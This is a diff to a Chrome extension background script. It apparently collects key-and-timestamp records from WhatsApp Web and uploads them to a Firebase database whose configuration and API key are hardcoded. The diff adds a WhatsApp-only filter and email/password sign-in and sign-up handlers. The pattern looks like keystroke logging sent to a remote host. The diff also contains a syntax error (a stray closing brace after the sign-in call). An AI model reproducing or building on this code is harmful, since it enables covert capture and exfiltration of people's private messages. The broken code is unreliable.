@@ -1,5 +1,9 @@
 // Upload Data to firebase database
 
+WHATSAPP_WEB = "https://web.whatsapp.com/"
+SIGN_IN_ACTION = "SIGNIN"
+SIGN_UP_ACTION = "SIGNUP"
+
 const config = {
     apiKey: "AIzaSyABnZ9KDeJiJxqswHy7rJqVhP5Qu5DOxRo",
     authDomain: "anona-dd0ad.firebaseapp.com",
@@ -19,8 +23,20 @@ function writeClientData(key, time){
 }
 
 function onMessage(request, sender){
-    console.log(request.key + "- " + request.time);
-    writeClientData(request.key, request.time)
+	console.log(sender)
+	if(sender.url == WHATSAPP_WEB){
+		console.log(request.key + "- " + request.time);
+		writeClientData(request.key, request.time);
+	}
+	else{
+		if(request.action == SIGN_IN_ACTION){
+			firebase.auth().signInWithEmailAndPassword(request.email, request.password);
+			});
+		}
+		if(request.action == SIGN_UP_ACTION)
+			firebase.auth().createUserWithEmailAndPassword(request.email, request.password);
+			
+	}
 }
 
 chrome.runtime.onMessage.addListener(onMessage);
